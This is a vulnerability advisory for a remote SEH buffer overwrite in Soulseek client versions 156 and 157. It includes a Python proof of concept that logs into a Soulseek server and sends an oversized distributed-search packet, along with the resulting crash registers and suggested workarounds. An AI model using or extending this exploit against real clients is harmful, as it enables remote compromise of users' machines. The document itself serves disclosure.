- Severity: critical
=============================================

I. VULNERABILITY
-------------------------
Soulseek 157 NS * & 156.* Remote Distributed Search Code Execution

II. BACKGROUND
-------------------------
"Soulseek(tm) is a unique ad-free, spyware free, and just plain free file
sharing application.
One of the things that makes Soulseek(tm) unique is our community and
community-related features.
Based on peer-to-peer technology, virtual rooms allow you to meet people with
the same interests, share information, and chat freely using real-time messages
in public or private.
Soulseek(tm), with its built-in people matching system, is a great way to make
new friends and expand your mind!"

III. DESCRIPTION
-------------------------
Soulseek client allows distributed file search to one person, everyone, or in a
specific Soulseek IRC channel, allowing a user to find the files he wants, in
a dedicated channel, or with his contacts, or on the whole network.
Unfortunatly this feature is vulnerable to a remote SEH overwrite to a specific
user, or even to a whole Soulseek IRC channel.

IV. PROOF OF CONCEPT
-------------------------
This proof of concept is made to prevent a S-K party, it is only build to
target the user "testt4321".

To try this proof of concept, you would have to open a soulseek client and use
the username:
"testt4321"
with the password:
"12345678"
And launch this code.
If you want to change the username or target a whole channel, you would have
to reverse the protocol :)



#!/usr/bin/python
import struct
import sys, socket
from time import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("208.76.170.50",2242))  # Change to Port 2240 for 156* branch

buffer = "\x48\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00\x74\x65\x73\x74"
buffer+= "\x34\x33\x32\x31\x08\x00\x00\x00\x31\x32\x33\x34\x35\x36\x37\x38"
buffer+= "\xb5\x00\x00\x00\x20\x00\x00\x00\x38\x65\x39\x31\x66\x37\x33\x30"
buffer+= "\x35\x35\x37\x31\x32\x35\x64\x37\x34\x39\x32\x34\x62\x64\x66\x35"
buffer+= "\x63\x32\x39\x61\x36\x37\x64\x61\x01\x00\x00\x00"

s.send(buffer)
sleep(1)

junk = "\x41" * 3084
next_seh = struct.pack('<L', 0x42424242)
seh =      struct.pack('<L', 0x43434343)
other_junk = "\x61" * 1423

buffer2 = "\x01\x0f\x00\x00\x2a\x00\x00\x00\x09\x00\x00\x00\x74\x65\x73\x74"
buffer2+= "\x74\x34\x33\x32\x31\xa4\x5a\x51\x44\xe8\x0e\x00\x00"+junk+next_seh+seh+other_junk
s.send(buffer2)
sleep(1)
s.recv(1024)



After the query is send, the memory will look like this
0012FBE4   41414141
0012FBE8   42424242  Pointer to next SEH record
0012FBEC   43434343  SE handler
0012FBF0   61616161

And the program will terminate with this structure:
EAX 00000000
ECX 43434343
EDX 7C9132BC ntdll.7C9132BC
EBX 00000000
ESP 0012EA78
EBP 0012EA98
ESI 00000000
EDI 00000000
EIP 43434343


V. BUSINESS IMPACT
-------------------------
An attacker could exploit this vulnerability to compromise any Soulseek client connected to
the Soulseek network.

VI. SYSTEMS AFFECTED
-------------------------
Windows all versions

VII. SOLUTION
-------------------------
A fast solution would be to use Nicotine-Plus (http://nicotine-plus.sourceforge.net/)
a Python Soulseek client.
Another quick workaround at server level would be to limit the search query lenght.
